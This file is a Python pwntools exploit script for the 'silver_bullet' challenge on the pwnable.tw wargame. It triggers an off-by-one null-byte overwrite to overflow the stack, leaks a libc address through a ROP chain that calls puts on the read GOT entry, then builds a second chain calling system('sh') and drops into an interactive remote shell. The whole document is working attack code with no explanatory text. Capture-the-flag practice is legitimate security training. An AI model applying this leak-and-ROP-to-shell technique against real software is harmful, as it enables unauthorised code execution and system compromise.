from pwn import *

libc = ELF('libc_32.so.6')
silver_bullet = ELF('silver_bullet')


class Prompts:
    CHOICE = 'Your choice :'
    BULLET_DESCRIPTION = 'Give me your description of bullet :'
    ANOTHER_BULLET_DESCRIPTION = 'Give me your another description of bullet :'
    WIN = 'You win !!\n'


class Choices:
    CREATE_BULLET = '1'
    POWER_UP = '2'
    BEAT = '3'
    EXIT = '4'


def set_initial_power():
    print('[*] Setting initial power to max power - 1.')
    p.sendafter(Prompts.CHOICE, Choices.CREATE_BULLET)
    p.sendafter(Prompts.BULLET_DESCRIPTION, 'A' * 0x2f)


def reset_power():
    print('[*] Powering up by 1 so that the terminating nullbyte overwrites the power.')
    p.sendafter(Prompts.CHOICE, Choices.POWER_UP)
    p.sendafter(Prompts.ANOTHER_BULLET_DESCRIPTION, 'A' * 0x1)
    print('[*] Power is equal to 1 while the description buffer is full.')


def leak_chain():
    power = 0xffffffff
    chain = rop.ROP(silver_bullet)

    chain.puts(silver_bullet.got['read'])
    chain.main()

    print('[*] Setting power to beat Gin.')
    print('[*] Placing the leak chain on the stack.')
    print('[*] Jumping back to main()')
    payload = p32(power) + b'AAA' + chain.chain()
    p.sendafter(Prompts.CHOICE, Choices.POWER_UP)
    p.sendafter(Prompts.ANOTHER_BULLET_DESCRIPTION, payload)


def system_chain(libc_addr):
    power = 0xffffffff
    system_addr = libc_addr + libc.sym['system']
    sh_addr = libc_addr + next(libc.search(b'sh\0'))

    chain = rop.ROP(silver_bullet)
    chain.call(system_addr, [sh_addr])
    print('[*] Setting power to beat Gin.')
    print('[*] Placing the leak chain on the stack.')
    print('[*] Jumping back to main()')
    payload = p32(power) + b'AAA' + chain.chain()
    p.sendafter(Prompts.CHOICE, Choices.POWER_UP)
    p.sendafter(Prompts.ANOTHER_BULLET_DESCRIPTION, payload)


def beat(recv_libc=False):
    p.sendafter(Prompts.CHOICE, Choices.BEAT)
    p.recvuntil(Prompts.WIN)
    if recv_libc:
        libc_base_addr = u32(p.recv(4)) - libc.sym['read']
        print(f'[*] libc base address: {hex(libc_base_addr)}')
        return libc_base_addr


# p = gdb.debug(
#     silver_bullet.path,
#     '''
#     # b *main+0x5b
#     # b *main+0x69
#     b *main+0x7b
#     c
#     ''',
#     env=dict(LD_PRELOAD=libc.path)
# )


p = remote('chall.pwnable.tw', 10103)


def main():
    set_initial_power()
    reset_power()
    leak_chain()
    libc_base_addr = beat(recv_libc=True)
    set_initial_power()
    reset_power()
    system_chain(libc_base_addr)
    beat()
    p.interactive()


if __name__ == "__main__":
    main()
